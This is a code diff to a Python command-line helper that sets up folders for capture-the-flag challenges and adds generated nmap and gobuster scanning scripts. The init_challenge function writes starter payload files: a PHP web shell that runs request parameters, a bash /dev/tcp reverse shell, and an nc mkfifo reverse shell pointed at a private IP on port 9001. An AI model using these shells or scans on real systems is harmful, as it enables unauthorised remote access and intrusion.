@@ -12,11 +12,75 @@ from typing import Optional, Union
 script_dir = Path(os.path.expanduser("~")) / ".local" / "ctf-script"
 CONFIG_FILE = script_dir / "ctf_challenges.json"
 CTF_LISTS = script_dir / "list_of_ctf.json"
+
+
+# Default challenges and categories
 DEFAULT_CHALLENGES = ["HTB", "THM", "GPT", "DPSK", "PICO", "VHUB"]
 DEFAULT_CATAGORIES = []
 def_SUFFIX = "done"
 def_PARENT_DIR = "ctfs"
 
+# To check configuratin files exist or not
+def check_config():
+    # make sure that CONFIG_FILE exists
+    if not script_dir.exists():
+        script_dir.mkdir(parents=True, exist_ok=True)
+    elif not CONFIG_FILE.exists():
+        with CONFIG_FILE.open("w") as f:
+            # Dump DEFAULT_CHALLENGES challenges for the key "challenges"
+            json.dump({"challenges": DEFAULT_CHALLENGES}, f, indent=2)
+            return DEFAULT_CHALLENGES
+    else:
+        with CONFIG_FILE.open("r") as f:
+            data = json.load(f)
+            return data.get("challenges")
+
+def write_files(file_path, content):
+    try:
+        with open(file_path, "w") as f:
+            f.write(content)
+        print(f"[+] Created file: {file_path}")
+    except PermissionError as e:
+            print(f"[-] Permission denied to create {file}\n{e}")
+    except Exception as e:
+        print(f"[-] Something went wrong creating {file}\n{e}")
+    
+    return
+
+# To create the scanning scripts and config files in script directory if not exists
+def create_scripts(mode=None):
+    gobuster_scan = script_dir / "gobuster-scan.sh"
+    gobuster_vhub = script_dir / "gobuster-vhub.sh"
+    nmap_scan = script_dir / "nmap-scan.sh"
+    nmap_vhub = script_dir / "nmap-vhub.sh"
+    
+    list_of_files = [gobuster_scan, gobuster_vhub, nmap_scan, nmap_vhub]
+    
+    gobuster_scan_content = """#!/bin/bash\n\ngobuster dir -u http://$1 -w /opt/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,php.bak,bak -o root.gobuster"""
+    gobuster_vhub_content = """#!/bin/bash\n\ngobuster dir -u http://$1 -w /opt/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,php.bak,bak,txt,zip -o root.gobuster"""
+    nmap_scan_content = """#!/bin/bash\n\nnmap -sC -sV -v -oN nmap.txt $1"""
+    nmap_vhub_content = """#!/bin/bash\n\nnmap -sC -sV -v --min-rate 5000 -oN nmap.txt $1"""
+    
+    list_of_contents = [gobuster_scan_content, gobuster_vhub_content, nmap_scan_content, nmap_vhub_content]
+    
+    # make sure that CONFIG_FILE exists
+    if not script_dir.exists():
+        script_dir.mkdir(parents=True, exist_ok=True)
+    # go through each file and create if not exists
+    for file, content in zip(list_of_files, list_of_contents):
+        if not file.exists():
+            write_files(file, content)
+            try:
+                os.chmod(file, 0o755)  # Make the script executable
+            except Exception as e:
+                print(f"[-] Could not set executable permission for {file}: {e}")
+        else:
+            if mode == "create":
+                print(f"[=] Script {file} already exists.")
+            continue
+    return
+    
+    
 # To clean up files in challenge directory after marking it done
 def cleanup_challenge_files(challenge_dir: Union[str, Path]):
     """
@@ -211,23 +275,6 @@ def save_ctf(ctf_info, difficulty=None, **kwargs):
     except Exception as e:
         print(f"Error {e}")
 
-
-# To check configuratin files exist or not
-def check_config():
-    # make sure that CONFIG_FILE exists
-    if not script_dir.exists():
-        script_dir.mkdir(parents=True, exist_ok=True)
-    elif not CONFIG_FILE.exists():
-        with CONFIG_FILE.open("w") as f:
-            # Dump DEFAULT_CHALLENGES challenges for the key "challenges"
-            json.dump({"challenges": DEFAULT_CHALLENGES}, f, indent=2)
-            return DEFAULT_CHALLENGES
-    else:
-        with CONFIG_FILE.open("r") as f:
-            data = json.load(f)
-            return data.get("challenges")
-
-
 # To mark challenges Done
 def mark_challenge_completed(
     target: Union[str, Path],
@@ -326,36 +373,37 @@ def validate_dirs(current_dir, parent_directory):
             sys.exit(1)
     else:
         print("[-] Currently does not support pico challenges")
-        sys.exit(1)
-
-def write_files(file_path, content):
-    try:
-        with open(file_path, "w") as f:
-            f.write(content)
-    except Exception as e:
-        print(f"[-] Something went wrong writing to file : {file_path}\n {e}")
-    
+        sys.exit(1)    
 
 # Function to initialize new challenge
 def init_challenge(category4new_challenge, new_challenge_name):
-    # The following are ctf starting files like php,sh,python rev shells
+    # The following are ctf starting files like php,sh,python rev shells and scanning scripts
+            # Rev shells, You can modify them as per your need
     content_of_php_rev_shell = """<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>"""
     content_of_php_rev_short = """<?php system($_REQUEST['cmd']); ?>"""
     content_of_bash_rev_short = """/bin/bash -i >& /dev/tcp/port/9001 0>&1"""
     content_of_nc_mkfifio = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.105.231 9001 >/tmp/f"""
-    
+        # Scanning scripts
+    gobuster_scan = script_dir / "gobuster-scan.sh"
+    gobuster_vhub = script_dir / "gobuster-vhub.sh"
+    nmap_scan = script_dir / "nmap-scan.sh"
+    nmap_vhub = script_dir / "nmap-vhub.sh"
+        
+        
     base_dir = Path.home() / "challenges" / "ctfs"
     target_path = base_dir / category4new_challenge / new_challenge_name
     lab_path = target_path / "lab"
     
     if not (base_dir / category4new_challenge).is_dir():
-        print(f"Existing directory '{category4new_challenge}' not found under ~/challenges/ctfs.\n You can provide other Base directory with --newbase flag")
+        print(f"Existing directory '{category4new_challenge}' not found under ~/challenges/ctfs.\n You can provide other Base directory with -p flag")
         sys.exit(1)
+    
+    # Create the new challenge directory
     try:
         target_path.mkdir(parents=True, exist_ok=False)
         print(f"[+] Created directory: {target_path}")
         lab_path.mkdir(parents=True, exist_ok=False)
-        #print(f"Created directory: {lab_path}")
+        #print(f"Created directory: {lab_path}")      
     except FileExistsError:
         print(f"Directory {target_path} already exists.")
         sys.exit(1)
@@ -383,8 +431,27 @@ def init_challenge(category4new_challenge, new_challenge_name):
     write_files(bash_rev, content_of_bash_rev_short)
     write_files(nc_fifo, content_of_nc_mkfifio)
     
-    sys.exit(0)
+    # Copy scanning scripts to lab directory if they exist
+    if category4new_challenge == "vhub":
+        try:
+            if not nmap_vhub.exists() or not gobuster_vhub.exists():
+                print(f"[-] Scanning scripts not found in {script_dir}\n Please make sure you have nmap-vhub.sh and gobuster-vhub.sh scripts in {script_dir}\n Run with --create flag to create them")
+                sys.exit(1)
+            shutil.copy(nmap_vhub, target_path / "nmap-vhub.sh")
+            shutil.copy(gobuster_vhub, target_path / "gobuster-vhub.sh")
+        except Exception as e:
+            print(f"[-] Something went wrong copying vhub scanning scripts to {target_path}\n {e}")
+            sys.exit(1)
+    else:
+        try:
+            if not nmap_scan.exists() or not gobuster_scan.exists():
+                print(f"[-] Scanning scripts not found in {script_dir}\n Please make sure you have nmap-scan.sh and gobuster-scan.sh scripts in {script_dir}\n Run with --create flag to create them")
+            shutil.copy(nmap_scan, target_path / "nmap-scan.sh")
+            shutil.copy(gobuster_scan, target_path / "gobuster-scan.sh")
+        except Exception as e:
+            print(f"[-] Something went wrong copying scanning scripts to {target_path}\n {e}")
 
+    return
 
 # The main function that handles all the tasks smoothly
 def main():
@@ -411,6 +478,13 @@ def main():
         help="Enter the difficulty for the challenge (optional)",
     )
     parser.add_argument(
+        "--create",
+        type=str,
+        nargs="?",
+        const="create",
+        help="Create scanning scripts in script directory if not exists",
+    )
+    parser.add_argument(
         "--other",
         type=str,
         nargs="+",
@@ -434,6 +508,11 @@ def main():
     current_dir = Path.cwd()
     current_dir = current_dir.parts
     difficulty = args.difficulty if args.difficulty else None
+    
+    if args.create: # If user wants to create scanning scripts in script directory
+        create_scripts(mode="create")
+        sys.exit(0)
+    
     if difficulty:
         difficulty_list = ["easy", "medium", "hard", "insane"]
         if difficulty.lower() not in difficulty_list:
@@ -457,6 +536,7 @@ def main():
         #print(f"Challenge name: {name}")
         #print(f"Category: {category}")
         init_challenge(category, name)
+        sys.exit(0)
     
     parent_dir_index, current_challenge_type, current_challenge = validate_dirs(
         current_dir, PARENT_DIR
